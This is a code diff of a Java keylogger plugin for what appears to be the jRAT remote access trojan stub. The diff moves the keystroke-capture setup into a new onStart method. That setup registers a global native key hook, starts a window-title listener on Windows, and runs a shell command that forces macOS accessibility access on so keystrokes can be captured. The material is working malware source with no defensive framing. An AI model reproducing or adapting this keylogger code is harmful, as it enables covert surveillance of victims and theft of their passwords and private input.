@@ -6,6 +6,7 @@ import java.io.DataOutputStream;
 import java.io.InputStreamReader;
 
 import org.jnativehook.GlobalScreen;
+import org.jnativehook.NativeHookException;
 
 import pro.jrat.api.stub.StubPlugin;
 
@@ -20,40 +21,7 @@ public class KeyloggerPlugin extends StubPlugin {
 	public static final byte STATUS_HEADER = 123;
 
 	public void onEnable() throws Exception {
-		GlobalScreen.registerNativeHook();
-		GlobalScreen.getInstance().addNativeKeyListener(new Keylogger());
-
-		if (System.getProperty("os.name").toLowerCase().contains("win")) {
-			try {
-				new Thread(new TitleListener()).start();
-			} catch (Exception e) {
-				e.printStackTrace();
-			}
-		}
-
-		Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() {
-
-			@Override
-			public void run() {
-				try {
-					GlobalScreen.unregisterNativeHook();
-				} catch (Exception ex) {
-					ex.printStackTrace();
-				}
-			}
-
-		}));
 		
-		try {
-			System.out.println("Trying to enable assistive devices... Even if enabled");
-			
-			Runtime.getRuntime().exec("touch /private/var/db/.AccessibilityAPIEnabled");
-			
-			System.out.println("Successfully executed command");
-		} catch (Exception ex) {
-			ex.printStackTrace();
-			System.out.println("Failed to execute command. No root?");
-		}
 	}
 
 	public void onDisconnect(Exception ex) {
@@ -96,5 +64,43 @@ public class KeyloggerPlugin extends StubPlugin {
 
 	public static boolean isRoot() throws Exception {
 		return !System.getProperty("os.name").toLowerCase().contains("win") && new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("whoami").getInputStream())).readLine().equals("root");
+	}
+
+	@Override
+	public void onStart() throws Exception {
+		GlobalScreen.registerNativeHook();
+		GlobalScreen.getInstance().addNativeKeyListener(new Keylogger());
+
+		if (System.getProperty("os.name").toLowerCase().contains("win")) {
+			try {
+				new Thread(new TitleListener()).start();
+			} catch (Exception e) {
+				e.printStackTrace();
+			}
+		}
+
+		Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() {
+
+			@Override
+			public void run() {
+				try {
+					GlobalScreen.unregisterNativeHook();
+				} catch (Exception ex) {
+					ex.printStackTrace();
+				}
+			}
+
+		}));
+		
+		try {
+			System.out.println("Trying to enable assistive devices... Even if enabled");
+			
+			Runtime.getRuntime().exec("touch /private/var/db/.AccessibilityAPIEnabled");
+			
+			System.out.println("Successfully executed command");
+		} catch (Exception ex) {
+			ex.printStackTrace();
+			System.out.println("Failed to execute command. No root?");
+		}
 	}
 }
